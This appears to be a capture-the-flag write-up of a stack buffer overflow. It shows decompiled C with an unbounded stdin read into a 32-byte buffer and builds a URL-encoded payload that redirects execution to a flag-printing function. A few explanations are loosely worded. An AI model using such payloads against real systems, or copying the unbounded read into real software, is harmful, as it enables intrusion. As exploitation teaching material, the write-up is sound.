```c
undefined8 main(void)
{
  char text [32];
  
  memset(text,0,0x20);
  read_all_stdin(text);
  if (text[0] == '\0') {
    puts("What is your name?");
  }
  else {
    printf("Hello %s!\n",text);
  }
  return 0;
}
```

allocated 32 bytes for text, and reads with `read_all_stdin`

```c
void read_all_stdin(long name)
{
  int input;
  int counter;
  
  counter = 0;
  while( true ) { // bad exit condition?
    input = fgetc(stdin);
    if (input == -1) break; // only checks if no more input!
    *(undefined *)(name + counter) = (char)input; // pointer to next char
    counter = counter + 1;
  }
  return;
}
```

We can use this for buffer overflow

Print flag function

```c
void print_flags(void)
{
  char *__s;
  
  __s = getenv("FLAGS");
  puts(__s);

  exit(0);
}
```

At memory address `004006ee`

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

since this is 64 bit process we need 8 bytes for header

```
00 00 00 00 00 40 06 ee
```

Due to Endianness we need to reverse order of hex

```
ee 06 40 00 00 00 00 00
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA00000000004006ee
```

Since input on site encodes input we paste directly in url with already correct encoding

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%ee%06%40%00%00%00%00%00
```
